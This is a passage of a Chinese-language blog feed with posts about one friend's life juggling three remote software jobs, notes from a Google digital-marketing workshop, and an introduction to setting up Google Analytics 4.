的運氣很好，在之前的工作中遇到了一個不錯的主管，也變成他後來的老闆，弱連結，很可能就是造就你職涯轉換的關鍵。</p><p>小編個人第一次拿到顧問合約是從台元離開的時候，那時候公司找了很久都找不太到接替的人選，但我又很想直接轉純前端，所以主管主動幫我爭取了半年的顧問合約，目的是在新的人來的時候，我可以從旁協助他更快進入狀況，還有把我目前專案後續新的需求繼續做完，所以也許先在公司做一陣子，再談遠端或是 Part-time 的需求真的會簡單很多，對公司來說一來省勞健保二來省電費。另外我覺得同學提到加乘效果也是很棒的概念，在我的理解上是表示現在做的事情對我們朝向終點的速度是有幫助的。</p><p>在工作價值上，人一輩子的時間總是有限的，做喜歡的事情讓喜歡的事情有價值，在職場現實與鬥爭中真的相對困難許多，每種人生都有各自的優缺點也都各不相同，重要的真的就是想清楚自己想過的是什麼樣的人生。</p><p>大家如果好奇更多的心得，可能短期沒有下一篇連載了，如果還是很好奇想找他多聊聊，也歡迎直接寄信給我的高中同學。</p><blockquote><p><a href="mailto:hsiehpeitsang@gmail.com">hsiehpeitsang@gmail.com</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 職涯發展 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>怎麼兼職? 身兼三份工作的真實樣貌</title>
      <link href="/2020/11/25/career-remote-work-life/"/>
      <url>/2020/11/25/career-remote-work-life/</url>
      
        <content type="html"><![CDATA[<p>前篇文章提到高中同學屁蒼<a href="https://linyencheng.github.io/2020/11/17/career-remote-work-interview/">怎麼做到同時服務三家公司</a>，這篇文章就帶大家看看同時執行三份工作的真實樣貌，接下來為了方便文章撰寫，在文章中會把流浪的攻城獅屁蒼稱呼為 H，底下順便附上 H 大大點的兼職技能樹。</p><ul><li>App: Android Studio</li><li>PC: Visual Studio</li><li>MCU: Segger Studio</li><li>協作: 版本控制系統</li></ul><h2 id="三間公司的目標與選擇"><a href="#三間公司的目標與選擇" class="headerlink" title="三間公司的目標與選擇"></a>三間公司的目標與選擇</h2><p>H 在剛接受第三份工作時，初期是有造成不太穩定的情況，沒想到加入新的工作後即便火力全開也常只是勉強跟上進度，最顯著的地方在睡覺時間大幅減少。</p><p>初期狀況會像是勉強 C 在線、B 掉隊、A 停滯。 時不時會想兩個工作似乎比較理想，有時會想放掉一個。預計最近 C 這波忙完、B 跟上、A 前進。剛剛 B 搞了兩三個星期的東西，終於看到些感動的成果。</p><p>因為 H 屬於長期遠端的員工，所以在跟各公司日常對話上也都蠻有趣的。</p><blockquote><p>B 主管：我也想在家工作，App 好寫嗎？<br>H：App 水很深呀，別隨便跳進來，會溺水喔 🙃</p></blockquote><blockquote><p>同事最常問的問題: 你明天會來嗎？</p></blockquote><blockquote><p>主管也會問: 那臨時要找人怎麼辦，你若不看手機，不就找不到你了?<br>H : 是。但即便在公司，有時候我要找的人很忙或不在位置上，效果也等同於找不到他。而且說真的，有些問題不差那幾分鐘，甚至事後想想沒回答也沒差。</p></blockquote><blockquote><p>H: 嘿嘿，想不想用用看 git，效果等同於你每天複製資料夾喔~ 可以看到你每天改什麼，改壞了還可以復原，甚至倒帶呢 (音樂下?!)<br>H: 主管大大，用了 git，我們就不用每天傳來傳去了，你還可以看到我每天做什麼喔~ 要不要玩玩看?<br>同事: 又 error 啦，今天我改了什麼，改好多，我也忘記我改哪了，怎麼辦 QQ<br>H: 嘿嘿，有比對工具喔，你可以跟昨天的比<br>同事: 真的嗎? 整個專案比也可以?<br>H: 真的喔~ 我來用 meld 試給你看</p></blockquote><blockquote><p>H 也曾在 C 公司看到老闆在盛怒之下當眾轟走員工。<br>老闆: 你，XXX 竟敢嗆我，你算哪根蔥，你給我現在辦離職!!!<br>XXX: 是，我不是蔥，我就走<br>老闆: 我忍你很久了，20 年的交情到此為止<br>過了兩天，老闆開會表示: 那 XXX 員工多麼糟糕，我平常脾氣是很好的<br>再過兩天，老闆開會表示: XXX 想回來也可以，只要跟我道歉，請大家吃飯</p></blockquote><p>從 C 公司的對話可以看出主因不是工程師太弱，而 C 公司的發展員工大多也不是太在意。後來同事開始陸續離職，H 也搭了順風車跟著提之後被用加薪慰留，H 卻表示錢不是主要只想要舒服工作，最好可以不用每天待整天甚至減薪也可。可能是公司流動率高加上 H 有即戰力，公司很有誠意的表示可以彈性工作，不用開會有必要再來也不會安排太多事，但薪資就調比較低。</p><blockquote><p>H 認為老闆和員工的矛盾常常是來自員工想要的太多或是發現老闆拿的太多，但總量卻是有限的。</p></blockquote><p>同時擁有三份工作的好處在可以減少對公司的依賴，也因為常常找老闆 PK 的關係，更了解公司的運作模式也更能體諒老闆，也因為更了解金錢流動方向，所以在知道對應代價的前提下就比較不會想拿太多，也更知道自己的定位在哪。</p><h2 id="關於遠端的工作模式與成本"><a href="#關於遠端的工作模式與成本" class="headerlink" title="關於遠端的工作模式與成本"></a>關於遠端的工作模式與成本</h2><p>H 同時做了三份類型不太相同的遠端工作，成本最大的應該是在溝通還有專案切換上。</p><p>以溝通成本來說，成效會比當面溝通低，除了 Email 以外會透過電話上談，有需要 H 還是會去公司，只能說溝通蠻花時間的，那該怎麼增加有效溝通? 最重要的還是在雙方的準備與了解程度。</p><p>之前 H 到公司 B，發現參與的人若沒準備，也沒被特別預告會議要談什麼，當場的會議效果其實有限。公司 C 每週的兩次會議比較像是老闆佈道大會，會把不同專業的人放在一起討論問題，H 此時就會認為讓軟體工程師聽馬達設計對專案幫助有限。</p><blockquote><p>開會前提早通知訂下的主題、需要處理的議題，減少不相關的參與人員其實就是幫公司省錢</p></blockquote><p>H 在專案的分配上，切來切去容易造成效率下降，通常當天不會切來切去，最多就白天一個晚上一個，或是上午一個下午之後另一個，專案通常以半天為單位切換，切過去就盡量不要想另一個專案。</p><p>在工作進度上，H 會有個工作清單，這樣在專案切換時會知道要做什麼、做到哪。畢竟當遇到沒有 PM 的公司，H 就需要自己估時間和排進度，沒有 PM 下場是常常大家拖太久也沒人發現，直到交貨前才爆炸，但也沒辦法，H 也只能做到顧好自己的，文件上公司 B 有個跟 H 配合的小菜鳥，有些懶得整理文件也會請同事協助整理。</p><p>通常在開始手上任務前，會跟主管稍微確認一下任務大小，有可能兩三天都不會有人跟 H 交流。然後兩三天後主管來看看進展。特別是在主管對技術不熟的情況下，中間過程更不會來找 H 只要求結果正確。若條件許可 (像只能用公司機器測) 其實 H 在家做或辦公室做是沒有差別的，總的來說，H 目前看不出來去辦公室辦公對寫軟體的絕對優勢。(我自己是覺得公司冷氣都蠻冷的，歪樓 XDDD</p><p>H 在選擇工作環境上，發現一直待在套房工作，好像會愈來愈孤僻。在辦公環境上，特別是自己要長時間待的環境，沒有一些美感的話又很難受，科技業又常常是男生居多，通常也不太在意外型，每天看著中年大叔、肥宅，H 看著看著就感到難受呀 XDDD 現在則常常去生意比較不好的咖啡店工作，因為生意太好不好意思坐太久。女店員若可愛也很好，有時也可以聊上幾句就是開心。通常一次 150 元，若一周四次 150x4x4，一個月大概 2400，說貴嗎? 如果想成是入場費，扣掉飲料 60 元，坐三小時一個小時約 30 元，還是比在外面租個辦公室便宜許多，而且還可以換來換去。</p><h2 id="不是異想天開"><a href="#不是異想天開" class="headerlink" title="不是異想天開"></a>不是異想天開</h2><p>那些以為主管或老闆都會知道或發現的事，其實都沒有，有時主管自己說過的都會忘記。</p><p>C 的第三家公司是十人公司， 扣除三個元老，其他人最資深一年，再來就 3 個月，因為公司沒有使用版本控制軟體的關係，只能每天寄整個專案給主管表達愛與關懷? 但主管連下屬寄錯可能都不知道 🤣 每天寄專案，主管應該也只是收藏著我們寄的 Code。為什麼 H 會這麼覺得? 因為，最近有一次 H 寄錯也被沒發現 XD</p><p>沒想到還是存在沒用版控的公司，最近 H 試著有機會就教軟體主管跟同事，也為了讓未來可能輕鬆些，在同事還不會使用之前，像是透過 git stash 協助大家，主管跟她同一份 code 各改各的，主管改完交給她自己處理，我把主管的 code 先 commit，匯出成 patch，把她的 code 先 stash，然後貼上 patch，再 unstash，這就是一些生活日常。</p><blockquote><p>辦公室同事跟裝潢無法自己選擇，但咖啡店多少可以</p></blockquote><p>一週五天朝九晚六是一種， 偶爾有需要到公司開會其他透過一些網路工具聯絡是一種，也許大家會好奇說第二種通常外面找不到? 沒錯，理想的工作通常是找不到，計畫通 H 就是不斷透過先做正職，上手後跟公司協商，慢慢往理想生活邁進。</p><p>大家如果好奇更多的心得，下一篇文章會寫<a href="https://linyencheng.github.io/2020/11/26/career-remote-work-values/">從辦公室到遠端，價值觀的轉換與改變</a>，如果還是很好奇想找他多聊聊，也歡迎直接寄信給我的高中同學。</p><blockquote><p><a href="mailto:&#x68;&#115;&#x69;&#101;&#x68;&#112;&#101;&#105;&#x74;&#115;&#x61;&#110;&#103;&#x40;&#103;&#x6d;&#97;&#x69;&#108;&#x2e;&#99;&#111;&#109;">&#x68;&#115;&#x69;&#101;&#x68;&#112;&#101;&#105;&#x74;&#115;&#x61;&#110;&#103;&#x40;&#103;&#x6d;&#97;&#x69;&#108;&#x2e;&#99;&#111;&#109;</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 職涯發展 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>22K 很少，那如果是三份 22k+ 的工作呢</title>
      <link href="/2020/11/17/career-remote-work-interview/"/>
      <url>/2020/11/17/career-remote-work-interview/</url>
      
        <content type="html"><![CDATA[<p>這篇文章會分享最近跟高中同學屁蒼聊職涯後的心得，接下來為了方便文章撰寫，在文章中會把屁蒼稱呼為 H。</p><blockquote><p>H 從事軟體工作兩年後感到身心俱疲，覺得工程師就該這樣每天上下班嗎?</p></blockquote><p>還記得五年前，我還在台元上班的時候，他那時在我隔壁棟大樓，台元就像個巨型鳥籠般提供許多小空間讓大家進行腦力激盪，關久了說實話真的會懷疑人生，還記得我阿公快過世前，我常常爬到公司頂樓，想著即便讀了那麼多書能夠在這裡有輕鬆賺錢的能力，但面對生命其實也是無能為力。</p><p>H 在這幾年陸續受到一些書跟影片影響後開始去想</p><ul><li><strong>為什麼我們會這麼忙?</strong></li><li><strong>為什麼會被制度造成的消耗所影響?</strong></li></ul><p>而 H 在工作這幾年的過程中，也曾陸續跟主管提過能不能一周只上班 3 ~ 4 天，即使減薪也沒關係。但不意外的這些要求都是直接被拒絕，最後因為一些因素考量，想說保險業務的生活彈性許多就轉行去賣了保險，但賣到後來才明白這只是另一個坑，約略半年過去賣到懷疑人生。</p><h2 id="弱連結帶來的第一份軟體打工"><a href="#弱連結帶來的第一份軟體打工" class="headerlink" title="弱連結帶來的第一份軟體打工"></a>弱連結帶來的第一份軟體打工</h2><p>在賣保險的過程中 H 巧遇了三次前主管，主管後來選擇離職出來創業，後來他問了 H 還有沒有想要繼續寫程式? 於是就這麼開啟了迄今兩年類似寫軟體打工的生涯，姑且稱為工作 A。</p><p>H 工作 A 的狀況是每周和老闆碰面一次，其他時間工作可以選擇在老闆租的辦公室或帶回家做。當 H 開始上手後覺得游刃有餘，於是選擇又兼了個假日廚房內場幫忙。這份假日廚房的工作做了半年，體驗了炸了一堆薯條還有同事講話很雞巴。</p><blockquote><p>H 想想認為兼職還是做軟體比較能加乘效果，就選擇離開了</p></blockquote><p>在那之後 H 又嘗試了幾次找尋遠端兼職的軟體工作，但我認為一部分有可能是對溝通表達能力、價值觀、安全感的綜合考量，基本上台灣的公司大部分都比較少這樣的制度，就算有也只會讓你 “很自由的超時工作”。大多數的面試過程就算能力可以，H 通常一提這個基本上就謝謝再通知。</p><p>後來 H 就想說認命了，不如找個正職，把工作 A 協調成晚上碰面好了。</p><p>H：老闆，我要再去找個工作喔，跟你知會一聲<br>公司 A 老闆：好喔，我覺得你太孤僻，出去見見世面也好<br>H 最後就放心的去找正職了</p><p>我在跟同學聊天的時候，才發現他在工作價值和選擇上是個很有趣的人，H 表示履歷表跟面試的部分也很有趣，雖然履歷表不知道對方有沒有認真看，但 H 自認都蠻認真寫的，而且認為每次寫的過程都是一次自我反省 (我相信大家都很常在面試的時候還是會被問一些已經寫的很清楚的問題)。</p><blockquote><p>H 透過跟之前老闆的信任關係，拿到了第一份可以閒暇兼職的工作</p></blockquote><h2 id="有了第一份兼職後的第二份正職"><a href="#有了第一份兼職後的第二份正職" class="headerlink" title="有了第一份兼職後的第二份正職"></a>有了第一份兼職後的第二份正職</h2><p>在公司 A 的老闆放行過後，H 找的第二份正職 (公司 B) 也是個蠻有趣的面試過程，這份工作是韌體工程師，H 表示這次面談整個過程真的快睡著了，底下摘錄有趣的面試過程。</p><p>來到公司後的自我期許？<br>H：身體健康<br>對主管的期待？<br>H：身體健康<br>對自己未來發展期許？<br>H：順其自然</p><p>對方：那～你要來嗎？<br>H：什麼？（驚醒<br>對方：你要來這工作嗎？(沒想到對方這麼直接，剛剛不是都互相打哈哈嗎？　<br>對方：我去叫我老闆來<br>H：恩，好</p><p>公司 B 老闆：聽說你有寫過 App<br>H：對呀，簡單的可以<br>公司 B 老闆：我們目前也缺 App 要不要來寫<br>H：好呀（想說 App 之後比較有機會能在家工作<br>H 後來還是提了不想每天進辦公室的想法，並為此討論了一小時，當然最後還是被拒絕這提案。</p><p>H 面試的當時是月初，隔天 H 就跟公司拿了 code 跟設備，老闆交代月底報到，但可以先做工作的內容。於是 H 就利用這個月嘗試透過 Email 同步進度，一直到月底時，對方發現不進辦公室似乎真的可行，之後 H 就變成不用特別進辦公室的工程師，最長紀錄是一個半月沒進去，沒有業務往來的同事還以為 H 已經離職了。</p><blockquote><p>H 透過直接嘗試遠端協作的方法，讓對方主管看見且相信這樣的工作模式</p></blockquote><h2 id="當工作都變成遠端之後"><a href="#當工作都變成遠端之後" class="headerlink" title="當工作都變成遠端之後"></a>當工作都變成遠端之後</h2><p>當工作 A 和 B 又有點上手後，H 又開始異想天開覺得可以再找第三個工作。後來 H 找了一個十人小公司寫 PC 軟體，主要是做半導體機台，在面試公司 C 的時候，我覺得面試過程也是有點好笑。</p><p>對方: 你程式寫得如何?<br>H：一般般<br>對方: C#會嗎?<br>H：大概會吧</p><p>對方：對方開啟專案，給 H 看 C# 的變數宣告，然後問看得懂嗎？<br>H：可以<br>對方：看不懂要說喔～<br>在 H 點點頭後，對方持續給 H 看一些程式碼<br>H 大概看一下約略知道這程式碼的大意，邊看邊搖頭，表示沒問題 (就這樣持續了一分鐘)</p><p>對方：一直搖頭是看不懂還是？<br>H：沒有難度的意思<br>對方：嗯… 懂類別嗎？<br>H：大概吧<br>對方：有做過什麼專案？<br>H：最近是在做，按鈕去控制燈光，透過藍芽</p><p>對方：嗯… (H 覺得他現在應該是覺得，感覺這人有夠弱雞的)<br>對方: 期待的薪水，開個價？<br>H：28k<br>對方：？？@@，31 歲 28k？最低薪資呢？<br>H：22k，其實我 20k 能存活，22k 是法律下限，沒辦法<br>對方: 你 30 歲了唉，28k 不行吧，30k 啦，三個月試用期過後再調到 36k<br>H：嗯我心想，我的計畫是大概 3*28k 是我真實月薪</p><p>H 表示工作五、六年下來，面試應該也有十幾二十次，只能說找到合適的工作和老闆就一種感覺吧? 對了，H 的公司三最後也錄取了，H 也就開始了服務三家公司的兼職人生。</p><h2 id="被啟發的人生"><a href="#被啟發的人生" class="headerlink" title="被啟發的人生"></a>被啟發的人生</h2><p>H 為什麼會開始這樣的生活，其實是不久前 H 被一位網管前輩啟發，那位前輩同時接了好幾家公司的維運工作，伺服器大多數時候都沒問題，有問題也通常可以遠端處理。</p><p>H 聽了之後，開啟了他的想像力，就選擇了一條和其他人不同的職涯道路，相較於大多數的人追求的都是在同間公司一直加薪，H 在各個單位公司的月薪其實是一直下降。</p><p>對公司而言低薪 22k+ 即戰力加減用，對 H 來說別太多事沒事就不去辦公室很棒，一拍即合? 在每份工作其實都是有工作薪水天花板的前提下，也許這樣的職涯道路也是種選擇?</p><p>大家如果好奇更多的心得，下一篇文章會繼續寫<a href="https://linyencheng.github.io/2020/11/25/career-remote-work-life/">同時做三份工作的真實樣貌</a>，如果還是很好奇想找他多聊聊，也歡迎直接寄信給我的高中同學。</p><blockquote><p><a href="mailto:&#104;&#115;&#105;&#x65;&#x68;&#x70;&#101;&#x69;&#116;&#115;&#x61;&#x6e;&#x67;&#x40;&#103;&#x6d;&#97;&#x69;&#108;&#46;&#x63;&#x6f;&#109;">&#104;&#115;&#105;&#x65;&#x68;&#x70;&#101;&#x69;&#116;&#115;&#x61;&#x6e;&#x67;&#x40;&#103;&#x6d;&#97;&#x69;&#108;&#46;&#x63;&#x6f;&#109;</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 職涯發展 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 Grow with Google Tour</title>
      <link href="/2020/11/07/marketing-2020-grow-with-google-tour/"/>
      <url>/2020/11/07/marketing-2020-grow-with-google-tour/</url>
      
        <content type="html"><![CDATA[<p>最近 Google 有在推 <a href="https://events.withgoogle.com/2020-gwg-resource/2020-/">2020 Grow with Google Tour</a> 的線上直播課程，蠻推薦大家報名參加的，上周的心得在此，分享給大家 🤗🤗🤗</p><p>這次工作坊可以發現 Google 開始想推廣地圖的商家功能，對台灣來說 2019~2020 可說是 podcast + 社群元年，各大公司的社群經理漸漸開始活躍在各地，連公家機關都開始迷因治國，Google My Business 讓商家有機會透過 Google Map 直接和使用者互動，可以說是基於地圖的社群經營。</p><h2 id="打造數位能見度"><a href="#打造數位能見度" class="headerlink" title="打造數位能見度"></a>打造數位能見度</h2><p>幾個關鍵數據，一句話概括就是現在人不太用電腦，大部分時間都在滑手機。</p><ul><li>台灣人每天平均上網 7 小時 49 分鐘</li><li>1900 萬社群媒體使用，2 小時 25 分鐘平均使用</li><li>一天看 150 次手機</li><li>65% 交易來自行動裝置</li><li>行動上網 40%</li><li>中小企業手機版只有 32%</li></ul><p>全球網友最愛停留網站，參考資料的的 52-53，我們接下來就會從這三個最常用的網站分別探討怎麼增加數位能見度。</p><ul><li>Google</li><li>YouTube</li><li>Facebook</li></ul><p>參考資料:<br><a href="https://p.widencdn.net/kqy7ii/Digital2019-Report-en">https://p.widencdn.net/kqy7ii/Digital2019-Report-en</a></p><p>在數位能見度上，不管是個人或是商家都要能在 Google 上被找到，現在是屬於沒有太多隱私的時代，除非想當個一事無成的人，不然再爛至少也會有論文公開紀錄，那目前 Google 的結果會顯示網頁、Facebook 粉專、影片、google my business 等，所以實體商家除了可在 Google 地圖上面設點外也可以開始配合 google my business 使用。</p><p>這邊就不讓大家肉搜了小編的能見度了，好奇碩論的可以<a href="http://140.116.207.88/etdservice/view_metadata?etdun=U0026-1408201316260900&query_field1=all&query_word1=%E6%9E%97%E5%BD%A5%E6%88%90">直接點這裡</a>，主題寫的是群眾外包應用於藥物服用知識系統之研究，或是所有相關的小編的<a href="https://linyencheng.github.io/LinkFree/">傳送門</a> (根本沒人好奇硬是要放 XDDD)。</p><h2 id="到達頁面"><a href="#到達頁面" class="headerlink" title="到達頁面"></a>到達頁面</h2><p>要讓 Google 可以找到，最快的方式就是實作一個到達頁面，到達頁面是指點擊廣告後直接到達的網頁，通常是官網也可以是活動頁，官網如果很複雜也很難優化，就可以先做一頁式的到達頁面配合廣告用再導到官網，所以入門最容易的可以說是建立到達頁面了，常用的免費建站服務也蠻多的，像是</p><ul><li>Google Site</li><li>Wix</li><li>Weebly</li><li>Square Space</li></ul><p>現在架一個網站的門檻越來越低，也越來越多個人和商家擁有自己的網站，那網站的基本元素包含</p><ul><li>網域名稱 (.com or .tw): 可以依服務範圍決定要買哪個，當然大人的話可以都買</li><li>簡單好用的動線</li><li>清楚易懂說明</li><li>其他: 社群整合、搜尋功能</li></ul><p>另外因為現在大部分人只滑手機，行動裝置的優化就相對重要，建議用網路上的<a href="https://developers.google.com/speed/pagespeed/insights/?hl=zh-tw">免費載入速度測試工具</a>先測試一下網頁效能，最慢最慢三秒內要有東西載入，根據 <a href="https://www.thinkwithgoogle.com/marketing-strategies/app-and-mobile/mobile-page-speed-new-industry-benchmarks/">Google 的調查</a>載入 1~3 秒跳出率就增加了 32%，很可怕的。</p><p>此外講者有特別分享台灣中小企業手機版網站目前只有 32%，這大概也是為什麼現在路上一堆半路出家前端工程師可以瘋狂接案的原因了?</p><blockquote><p>載入 1~3 秒跳出率就增加了 32%<br><img src="https://storage.googleapis.com/twg-content/original_images/mobile-page-speed-new-industry-benchmarks-01-21.png" alt="mobile-page-speed"></p></blockquote><h2 id="影片素材"><a href="#影片素材" class="headerlink" title="影片素材"></a>影片素材</h2><p>目前主流主要是 YouTube，平均使用時間也可以到五分鐘，講者分享最大的差別在 YouTube 內容是被使用者搜尋出來的，所以忍受力會比較高，但唯一共同點是能夠讓使用者停留的黃金時間都非常短。</p><table><thead><tr><th>社群</th><th>黃金時間</th><th>使用時間</th></tr></thead><tbody><tr><td>YouTube</td><td>5s</td><td>5m</td></tr><tr><td>FB</td><td>3s</td><td>1m</td></tr><tr><td>IG</td><td>1s</td><td>30s ~ 1m</td></tr></tbody></table><iframe width="560" height="315" src="https://www.youtube.com/embed/RDR2Gcu6XJQ?controls=0" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><p>看完影片後可以想一下，短短 6 秒有什麼重點?</p><ul><li>影片有什麼重點?</li><li>主軸跟定位是什麼?</li><li>是不是有完整看完沒有想跳出?</li></ul><blockquote><p>我的感覺是: 夏天 + 辣妹 + 清爽 &#x3D; 冰可口可樂</p></blockquote><p>補個講者提供的數據，但我沒找到來源 QQ</p><ul><li>2017 57% 透過數位管道來看影片</li><li>超過一半透過行動裝置看影片</li></ul><h2 id="社群經營"><a href="#社群經營" class="headerlink" title="社群經營"></a>社群經營</h2><p>在 App 的使用上，其實分成兩種:</p><ul><li>剛需: 解決問題我想找東西，像是 Google</li><li>打發時間: 就只是想要找個地方花時間，像是 Facebook</li></ul><p>然而現在人花了很多在社群上，但在每則貼文上停留的時間卻不長，所以一則好的社群貼文可能會需要有以下特性</p><ul><li>五秒吸睛</li><li>說故事</li><li>想像力</li><li>激勵人心</li><li>跟影片互動</li><li>搞笑</li><li>跟風</li></ul><h2 id="評估曝光成效"><a href="#評估曝光成效" class="headerlink" title="評估曝光成效"></a>評估曝光成效</h2><p>在曝光成效的部分，只要做好相關設定就會出現在 google 的隨機搜尋結果，管理帳號記得設定給多個人，不然管理人離職或是忘記帳號密碼就有點麻煩，隨機搜尋的結果主要包含三個部分</p><ul><li>標題: 30 個半形字元</li><li>網址顯示: 15 個半形字元</li><li>說明: 90 個半形字元</li></ul><p>隨機搜尋的流程，商業面來說每個使用者都會經過至少 4~12 次才有機會下單，搜尋的次數會跟客單價或是產品使用週期有關係。舉一個使用者從搜尋到購買的 User Journey 來說</p><ol><li>搜尋 X 牌手機殼</li><li>發現充電手機殼</li><li>搜尋充電手機殼是否安全</li><li>看影片介紹</li><li>搜尋促銷的充電手機殼</li></ol><p>所以我們可以發現關鍵字是需要發想的? 簡單的話可以透過 <a href="https://linyencheng.github.io/2018/11/24/marketing-google-tools/">google 搜尋趨勢、自動完成、GA</a> 來協助我們優化關鍵字，透過一些常見的工具，還可以知道使用者是怎麼在看這些內容的，評估成效常用的工具有:</p><ul><li>Google Search Console: 關鍵字的成效</li><li>Google Analytics: GA 4 出來之後，已經可以整合 YouTube 的成效評估</li><li>Amplitude</li><li>Mixpanel</li></ul><p>為什麼會需要工具，因為像是 DAU、WAU、MAU 這類數據都不能用想像的，要怎麼知道這個訊息使用者是每天看、每周看、每月看，這個不太能靠感覺和想像，這時候就會需要看數據。</p><blockquote><p>最後網站有可能像簡報會習慣性只做介紹，有投廣告的話要記得補 Call to Action 不然看完就會沒有後續了喔 &gt;.^</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 數位行銷 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 數位行銷 </tag>
            
            <tag> Marketing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google Analytics 4 注意事項</title>
      <link href="/2020/11/03/marketing-google-analytics-4-quick-start/"/>
      <url>/2020/11/03/marketing-google-analytics-4-quick-start/</url>
      
        <content type="html"><![CDATA[<h2 id="Google-Analytics-4-簡介"><a href="#Google-Analytics-4-簡介" class="headerlink" title="Google Analytics 4 簡介"></a>Google Analytics 4 簡介</h2><p>Google Analytics 推出了第四代 GA4，目的是讓網頁 (GA) 和 APP (GA4F) 能夠一起分析，進一步提供了以隱私為中心的系統設計、跨裝置辨識和分析並提供更深度整合機器學習的報表介面，這篇文章接下來將介紹相關注意事項與開箱體驗心得。</p><p>GA4 合併了 GA 和 GA4F 後當然是有好處的，舉例來說能夠幫助行銷人員回答底下五個問題:</p><ol><li>是哪種行銷管道在不同的平台上吸引最多新用戶?</li><li>不分平台，總共有多少唯一身分的使用者?</li><li>App 和網站之間發生了多少次轉換?</li><li>哪個平台比較容易產生轉換?</li><li>評估跨平台行銷活動的成效，App 導了多少流量到網站購買或透過網站開啟了 App。</li></ol><p>參考資料: <a href="https://blog.google/products/marketingplatform/analytics/new_google_analytics">https://blog.google/products/marketingplatform/analytics/new_google_analytics</a></p><h3 id="隱私為中心的系統設計"><a href="#隱私為中心的系統設計" class="headerlink" title="隱私為中心的系統設計"></a>隱私為中心的系統設計</h3><p>以隱私為中心的系統設計，個人推測跟 GDPR、IDFA 政策實施後也有不小關係，畢竟接下來的法規也只會越來越嚴格，即使 Cookie 和身分識別無法使用也會提供基本的分析，但需要特別在設定中啟用信號 (Google Signals)。</p><p>參考資料: “Google 信號是指來自網站和應用程式的工作階段資料，Google 會將這類網站和應用程式與已登入 Google 帳戶並啟用廣告個人化的使用者建立關聯。將資料與這些已登入使用者建立關聯，是為了啟用跨裝置報表、跨裝置再行銷，以及能將跨裝置轉換匯出至 Google Ads 的功能。”</p><p>參考資料: <a href="https://support.google.com/analytics/answer/9445345?hl=zh-Hant">https://support.google.com/analytics/answer/9445345?hl=zh-Hant</a></p><blockquote><p>在設定中啟用信號<br><img src="/2020/11/03/marketing-google-analytics-4-quick-start/GoogleSignal.png" alt="GoogleSignal"></p></blockquote><h3 id="跨裝置辨識"><a href="#跨裝置辨識" class="headerlink" title="跨裝置辨識"></a>跨裝置辨識</h3><p>跨裝置辨識: 新版的分析取代了以往以平台或裝置為主的方式，提供了以顧客為中心的量測，透過行銷人員提供的 User IDs 或是 Google signals 來了解顧客。網頁實作上來說，登入前也可以產生 <a href="https://github.com/fingerprintjs/fingerprintjs">fingerprint</a> 鎖裝置然後登入後再彙整資料。</p><p>GA4 該以事件為基礎，查看使用者或是應用程式傳送的所有事件，辨識轉換在什麼時候發生</p><ul><li>Exploration: 可以將多個變量（用於衡量業務的維度和指標）拖拉後進行即時分析。</li><li>Funnels: 確定轉化的重要步驟，透過打開和關閉選項，了解用戶什麼進入什麼時候下車。</li><li>Path analysis: 了解用戶在渠道內各個步驟之間採取的行動，解釋用戶進行或未進行轉化的原因。</li></ul><p>參考資料: <a href="https://blog.google/products/marketingplatform/analytics/new-way-unify-app-and-website-measurement-google-analytics/">https://blog.google/products/marketingplatform/analytics/new-way-unify-app-and-website-measurement-google-analytics/</a></p><h3 id="整合機器學習"><a href="#整合機器學習" class="headerlink" title="整合機器學習"></a>整合機器學習</h3><p>在搜尋介面上，也提供了自然語言處理的搜尋介面，讓搜尋更適合行銷人員去使用。</p><blockquote><p>更平易近人的搜尋介面，可以參考<a href="https://support.google.com/analytics/answer/9357428?hl=zh-Hant&ref_topic=9303319">這份文件</a><br><img src="/2020/11/03/marketing-google-analytics-4-quick-start/AISearch.JPG" alt="AISearch"></p></blockquote><p>以機器學習為核心的報表: 如果數據的 Pattern 出現，做到預測未來也是有機會的，例如預測流失率來提早做出防範。</p><blockquote><p>以機器學習為核心的報表 <a href="https://blog.google/products/marketingplatform/analytics/access-google-surveys-and-google-analytics-4-data-data-studio/">(圖片來源)</a><br><img src="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/Screen_Shot_2020-10-26_at_4.27.09_PM.max-1000x1000.png" alt="google-analytics-4-data-data-studio"></p></blockquote><h2 id="如何安裝-Google-Analytics-4"><a href="#如何安裝-Google-Analytics-4" class="headerlink" title="如何安裝 Google Analytics 4"></a>如何安裝 Google Analytics 4</h2><p>如果是原本的網站中就有安裝 GA 的話，那在設定中的管理就有可以直接升級的選項，詳細的升級步驟可以參考文件如下:</p><p><a href="https://support.google.com/analytics/answer/9744165?hl=zh-Hant&ref_topic=9303319">https://support.google.com/analytics/answer/9744165?hl=zh-Hant&amp;ref_topic=9303319</a></p><blockquote><p>升級成 Google Analytics 4<br><img src="/2020/11/03/marketing-google-analytics-4-quick-start/UpdateToGA4.JPG" alt="UpdateToGA4"></p></blockquote><p>安裝方法其實跟舊版大同小異，都是按照引導就可以輕鬆完成，最簡單的就是在網頁一開始處嵌入一段程式碼。</p><blockquote><p>設定輔助程式<br><img src="/2020/11/03/marketing-google-analytics-4-quick-start/SetGA4.JPG" alt="SetGA4"></p></blockquote><p>升級之後原來的還是會保留，但可以看出來新版的會是提供 App + Web 的版本了。</p><blockquote><p>App + Web<br><img src="/2020/11/03/marketing-google-analytics-4-quick-start/ListInApp.JPG" alt="ListInApp"></p></blockquote><p>測試的話可以在瀏覽器中安裝 <a href="https://chrome.google.com/webstore/detail/gtmga-debug/ilnpmccnfdjdjjikgkefkcegefikecdc">gtmga-debug</a> 這個外掛，接著瀏覽網頁進行測試。</p><blockquote><p>gtmga-debug<br><img 